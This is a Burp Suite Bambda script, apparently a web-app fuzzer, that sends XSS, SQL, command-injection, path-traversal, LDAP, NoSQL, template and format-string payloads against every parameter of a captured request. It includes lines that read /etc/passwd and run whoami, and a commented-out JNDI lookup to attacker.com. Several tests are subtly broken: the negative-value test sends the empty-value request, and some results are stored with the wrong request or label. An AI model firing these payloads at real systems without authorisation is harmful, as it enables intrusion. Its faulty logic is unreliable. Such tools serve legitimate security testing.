// Quick Fuzzer Bambda Custom Action by zinja-coder@github
// This Bambda extracts all parameters and performs comprehensive fuzzing tests
// You can add/reduce payloads
// You can add/reduce test cases
// Optionally fuzz cookie parameters
// All requests are sent directly without creating new tabs, with detailed logging
// Uncomment and add more payloads as per requirement

// Delay variable, Adjust as per requirement - 1000 = 1 second delay
int GLOBAL_DELAY_MS = 100; 

// Different Payloads for Different Attack Types, Add more as per requirement
String[] SPECIAL_CHARS = {
	"!@#$%^&*()", "<>\"'", "[]{}|\\", "~`+=", ";:,./?"    
};

String[] XSS_PAYLOADS = {
	"<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg onload=alert('XSS')>",
    "'-alert('XSS')-'",
    "\"><script>alert('XSS')</script>",
    "<iframe src=javascript:alert('XSS')></iframe>"
};

String[] SQLI_PAYLOADS = {
    "' OR '1'='1",
    "'",
    "\"",
    "' OR 1=1#",
    "admin'--",
    "' OR 'a'='a",
    "1' OR '1'='1' /*"
};
    
// Command Injection Payloads
String[] COMMAND_INJECTION_PAYLOADS = {
    "; ls -la",
    "| whoami",
    "& dir",
    "`id`",
    "$(whoami)",
    "; cat /etc/passwd",
    "&& echo vulnerable",
    "; ping -c 1 127.0.0.1",
    "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "$(ping -c 1 127.0.0.1)"
};

// Path Traversal/Directory Traversal
String[] PATH_TRAVERSAL_PAYLOADS = {
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd%00",
    "file:///etc/passwd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
};

// LDAP Injection
String[] LDAP_INJECTION_PAYLOADS = {
    "*",
    "*)(&",
    "*))%00",
    ")(cn=*",
//    "*)(uid=*",
//    "admin)(&(password=*))",
    "*()|%26'"
};

// NoSQL Injection
String[] NOSQL_INJECTION_PAYLOADS = {
    "true, $where: '1 == 1'",
    ", $where: '1 == 1'",
    "$ne=1",
    "[$ne]=1",
//    "'; return true; var dummy='",
//    "{\"$gt\":\"\"}",
//    "{\"$regex\":\".*\"}"
};

// Server-Side Template Injection (SSTI)
String[] SSTI_PAYLOADS = {
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "{{config}}",
    "<%=7*7%>",
//    "${jndi:ldap://attacker.com/a}",
//    "{{request.application.__globals__}}"
};

// Format String Vulnerabilities
String[] FORMAT_STRING_PAYLOADS = {
    "%s%s%s%s%s%s%s%s%s%s",
    "%x%x%x%x%x%x%x%x%x%x",
    "%n%n%n%n%n%n%n%n%n%n",
    "%08x.%08x.%08x.%08x",
    "AAAA%08x.%08x.%08x.%08x"
};

// Email Validation Bypass
String[] EMAIL_BYPASS_PAYLOADS = {
    "test@test@test.com",
    "test..test@test.com",
    "test@",
    "@test.com",
    "test@test.",
    "\"test\"@test.com"
};

// JSON Injection
String[] JSON_INJECTION_PAYLOADS = {
    "\",\"injected\":\"true\",\"a\":\"",
    "\"}}],\"injected\":true,\"a\":[{\"b\":\"",
    "\",\"admin\":true,\"test\":\"",
    "\\\":\\\"\\\"}],\\\"injected\\\":true}"
};

// Business Logic Tests
String[] BUSINESS_LOGIC_PAYLOADS = {
    "0",
    "-1",
//    "999999999",
//    "-999999999",
//    "0.00",
//    "-0.01",
    "true",
    "false",
//    "null",
//    "undefined"
};

    
String[] INVALID_DATES = {
    "2024-13-01", "2024-02-30", "2024-00-15", "2024-12-32", "32/13/2024"
};
    
String[] INVALID_TIMES = {
    "25:30:00", "12:70:30", "10:30:70", "99:99:99", "ab:cd:ef"
};
    
// Get the request
var originalRequest = requestResponse.request();
var httpService = requestResponse.httpService();
    
// Extract all parameters based on request type
java.util.List<burp.api.montoya.http.message.params.HttpParameter> allParams = new java.util.ArrayList<>();
    
// Add URL parameters (GET)
allParams.addAll(originalRequest.parameters(burp.api.montoya.http.message.params.HttpParameterType.URL));
    
// Add body parameters (POST)
allParams.addAll(originalRequest.parameters(burp.api.montoya.http.message.params.HttpParameterType.BODY));
    
// Add JSON Parameters 
//String contentType = originalRequest.contentType().toString();
//if (contentType != null && 
allParams.addAll(originalRequest.parameters(burp.api.montoya.http.message.params.HttpParameterType.JSON));
    
// ------------------------------------------------------------ //
// -- Uncomment below line to fuzz cookie parameters as well -- //
//allParams.addAll(originalRequest.parameters(burp.api.montoya.http.message.params.HttpParameterType.COOKIE));
    
// if there are no parameter to fuzz then exit
if (allParams.isEmpty()) {
    logging.logToOutput("No parameters found to fuzz");
}
    
logging.logToOutput("[ ======================================= ]");
logging.logToOutput("QUICK FUZZER STARTED");
logging.logToOutput("Found " + allParams.size() + " parameters to test");
logging.logToOutput("Target: " + httpService.host() + ":" + httpService.port());
logging.logToOutput("[ ======================================= ]");
logging.logToOutput("CHECK ORGANIZER TAB FOR OUTPUT");
logging.logToOutput("[ ======================================= ]");
    
// Counter for tracking total requests
int totalRequests = 0;
StringBuilder results = new StringBuilder();
results.append("FUZZING RESULTS SUMMARY:\n\n");
    
// ------------------------------------------------------------ //
// --------------- FUZZING Starts ----------------------------- //

// for each parameter, perform all fuzzing tests
for (burp.api.montoya.http.message.params.HttpParameter param: allParams) {
    String paramName = param.name();
    String originalValue = param.value();
    
    logging.logToOutput("\n[ === Testing Parameter: " + paramName + " (original: '" + originalValue + "') === ]");
    results.append("Parameter: " + paramName + " (Type: " + param.type() + ")\n");
    results.append("Original Value: " + originalValue + "\n");
    logging.logToOutput("[ ======================================= ]\n");
    
    // -------------------------- Test 1: Special Characters -------------------- //
    logging.logToOutput("[ === Testing Special characters === ] ");
    for (String specialChar: SPECIAL_CHARS) {
    	String newValue = originalValue + specialChar;
        var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, newValue, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "SPECIAL CHAR: '" + specialChar;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with Special Char '" + specialChar + "': " + e.getStackTrace());
    	}

    }
    
    // -------------------------- Test 2: XSS -------------------- //
    logging.logToOutput("[ === Testing XSS PAYLOADS === ] ");
    for (String xssPayload: XSS_PAYLOADS) {
    	//String newValue = originalValue + xssPayload;
        var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, xssPayload, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "XSS Payload: '" + xssPayload;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with XSS Payload '" + xssPayload + "': " + e.getStackTrace());
    	}
    }
    
        // -------------------------- Test 3: SQLI -------------------- //
    logging.logToOutput("[ === Testing SQLI PAYLOADS === ] ");
    for (String sqliPayload: SQLI_PAYLOADS) {
    	String newValue = originalValue + sqliPayload;
        var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, newValue, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "SQLI Payload: '" + sqliPayload;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with SQLI Payload '" + sqliPayload + "': " + e.getStackTrace());
    	}
    }
    
    // -------------------------- Test 4: EMPTY VALUES -------------------- //
    logging.logToOutput("[ === Testing EMPTY PAYLOADS === ] ");
    var modifiedRequestEmpty = originalRequest.withParameter(
    	burp.api.montoya.http.message.params.HttpParameter.parameter(
    		paramName, "", param.type())
    );
    
    try {
    	var response = api.http().sendRequest(modifiedRequestEmpty);
     	int status = response.response().statusCode();
    	String result = "EMPTY: " + paramName + " -> Status: " + status;
    
    	// create request/response for organizer
    	var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequestEmpty, response.response());
    	// set annotation
    	requestResponseForOrganizer.annotations().setNotes(result);
    	// send to organizer
    	api.organizer().sendToOrganizer(requestResponseForOrganizer);
    	totalRequests++;
    } catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with EMPTY Payload '" + paramName + "': " + e.getStackTrace());
    	}
    
    // -------------------------- Test 5: INVALID DATES -------------------- //
    for (String date: INVALID_DATES) {
    	//String newValue = originalValue + date;
        var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, date, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "INVALID DATE: '" + date;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequestEmpty, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with INVALID DATE '" + date + "': " + e.getStackTrace());
    	}
    }
    
    
    // -------------------------- Test 6: INVALID TIME -------------------- //
    for (String time: INVALID_TIMES) {
    	//String newValue = originalValue + date;
        var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, time, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "INVALID DATE: '" + time;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequestEmpty, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with INVALID TIME '" + time + "': " + e.getStackTrace());
    	}
    }
    
    // -------------------------- Test 7: NEGATIVE VALUES -------------------- //
    logging.logToOutput("[ === Testing NEGATIVE PAYLOADS === ] ");
    String negativeValue = "-" + originalValue;
    var modifiedRequestNegative = originalRequest.withParameter(
    	burp.api.montoya.http.message.params.HttpParameter.parameter(
    		paramName, originalValue, param.type())
    );
    
    try {
    	var response = api.http().sendRequest(modifiedRequestEmpty);
     	int status = response.response().statusCode();
    	String result = "NEGATIVE: " + paramName + " -> Status: " + status;
    
    	// create request/response for organizer
    	var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequestEmpty, response.response());
    	// set annotation
    	requestResponseForOrganizer.annotations().setNotes(result);
    	// send to organizer
    	api.organizer().sendToOrganizer(requestResponseForOrganizer);
    	totalRequests++;
    } catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with NEGATIVE Payload '" + paramName + "': " + e.getStackTrace());
    	}
    
    // -------------------------- Test 8: INPUT LENGTH -------------------- //
    logging.logToOutput("[ === Testing INPUT LENGTH === ] ");
    StringBuilder longCharString = new StringBuilder();
    for (int i = 0; i < 300; i++) {
    	longCharString.append("a"); 
    }
    StringBuilder longIntString = new StringBuilder();
    for (int i = 0; i < 300; i++) {
    	longIntString.append("1");
    }
    
    ArrayList<StringBuilder> longStrings = new ArrayList<>();
    longStrings.add(longIntString);
    longStrings.add(longCharString);
    
    for (StringBuilder longString: longStrings) {
    	var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, longString.toString(), param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "Long String: ";
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequestEmpty, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with Long String:  '" + longString.toString() + "': " + e.getStackTrace());
    	}
    } 
    
    
    // -------------------------- Test 9: SSTI -------------------- //
    logging.logToOutput("[ === Testing SSTI PAYLOADS === ] ");
    for (String sstiPayload: SSTI_PAYLOADS) {
    	//String newValue = originalValue + xssPayload;
        var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, sstiPayload, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "SSTI Payload: '" + sstiPayload;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with SSTI Payload '" + sstiPayload + "': " + e.getStackTrace());
    	}
    }
    
    // -------------------------- Test 10: NOSQLI -------------------- //
    logging.logToOutput("[ === Testing NOSQLI PAYLOADS === ] ");
    for (String nosqliPayload: NOSQL_INJECTION_PAYLOADS) {
    	String newValue = originalValue + nosqliPayload;
        var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, newValue, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "NOSQLI Payload: '" + nosqliPayload;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with NOSQLI Payload '" + nosqliPayload + "': " + e.getStackTrace());
    	}
    }
    
    // -------------------------- Test 11: Path Traversal -------------------- //
    logging.logToOutput("[ === Testing Path Traversal PAYLOADS === ] ");
    for (String pathPayload: PATH_TRAVERSAL_PAYLOADS) {
    	//String newValue = originalValue + nosqliPayload;
        var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, pathPayload, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "Path Traversal Payload: '" + pathPayload;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with Path Traversal Payload '" + pathPayload + "': " + e.getStackTrace());
    	}
    }
    
    // -------------------------- Test 12: Command Injection -------------------- //
    logging.logToOutput("[ === Testing Command Injection PAYLOADS === ] ");
    for (String commandPayload: COMMAND_INJECTION_PAYLOADS) {
    	//String newValue = originalValue + nosqliPayload;
        var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, commandPayload, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "Command Injection Payload: '" + commandPayload;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with Command Injection Payload '" + commandPayload + "': " + e.getStackTrace());
    	}
    }
    
    // -------------------------- Test 13: LDAP Injection -------------------- //
    logging.logToOutput("[ === Testing LDAP Injection PAYLOADS === ] ");
    for (String ldapPayload: LDAP_INJECTION_PAYLOADS) {
    	//String newValue = originalValue + nosqliPayload;
        var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, ldapPayload, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "LDAP Injection Payload: '" + ldapPayload;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with LDAP Injection Payload '" + ldapPayload + "': " + e.getStackTrace());
    	}
    }
    
    // -------------------------- Test 14: JSON Injection -------------------- //
    logging.logToOutput("[ === Testing JSON Injection PAYLOADS === ] ");
    for (String jsonPayload: JSON_INJECTION_PAYLOADS) {
    	//String newValue = originalValue + nosqliPayload;
        var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, jsonPayload, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "JSON Injection Payload: '" + jsonPayload;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with JSON Injection Payload '" + jsonPayload + "': " + e.getStackTrace());
    	}
    }
    
    // -------------------------- Test 15: Invalid Emails -------------------- //
    logging.logToOutput("[ === Testing Invalid Emails PAYLOADS === ] ");
    for (String emailPayload: EMAIL_BYPASS_PAYLOADS) {
    	//String newValue = originalValue + nosqliPayload;
        var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, emailPayload, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "Invalid Email Payload: '" + emailPayload;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with Invalid Email Payload '" + emailPayload + "': " + e.getStackTrace());
    	}
    }
    
        // -------------------------- Test 16: String Format Payloads -------------------- //
    logging.logToOutput("[ === Testing String Format PAYLOADS === ] ");
    for (String stringformatPayload: FORMAT_STRING_PAYLOADS) {
    	//String newValue = originalValue + nosqliPayload;
        var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, stringformatPayload, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "Invalid String Format Payload: '" + stringformatPayload;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with String Format Payload '" + stringformatPayload + "': " + e.getStackTrace());
    	}
    }

    
    // -------------------------- Test 17: Business Logic PAYLOADS -------------------- //
    logging.logToOutput("[ === Testing Business Logic PAYLOADS === ] ");
    for (String bPayload: BUSINESS_LOGIC_PAYLOADS) {
    	//String newValue = originalValue + nosqliPayload;
        var modifiedRequest = originalRequest.withParameter(
    		burp.api.montoya.http.message.params.HttpParameter.parameter(
    			paramName, bPayload, param.type()
    		)
    	);
    
    	try {
    		var response = api.http().sendRequest(modifiedRequest);
            
            // delay between requests
            Thread.sleep(GLOBAL_DELAY_MS);
         
            int status = response.response().statusCode();
            int responseLength = response.response().body().length();
    
    		String result = "Business Logic Payload: '" + bPayload;
 			logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
    
    		// create request/response for organizer
    		var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
    		// set annotations
            requestResponseForOrganizer.annotations().setNotes(result);
            // send to organizer
            api.organizer().sendToOrganizer(requestResponseForOrganizer);
    
    		results.append(result + "\n");
            totalRequests++;
    	} catch (Exception e) {
    		logging.logToError("[ ======================================= ]");
    		logging.logToError("[ === QUICK FUZZER BAMBDA CUSTOM ACTION ERROR === ]");
    		logging.logToError("[ ======================================= ]");
            logging.logToError("Error with Business Logic Payload '" + bPayload + "': " + e.getStackTrace());
    	}
    }
    
}
    
// ------------------------------------------------------------ //
// --------------- FUZZING ENDS ----------------------------- //

logging.logToOutput("[ ======================================= ]");
logging.logToOutput("[ === QUICK FUZZING DONE === ]");    
logging.logToOutput("[ ======================================= ]\n");
logging.logToOutput("Parameters tested: " + allParams.size() + "\nTotal Requests: " + totalRequests + "\nCheck the organizer tab for output");
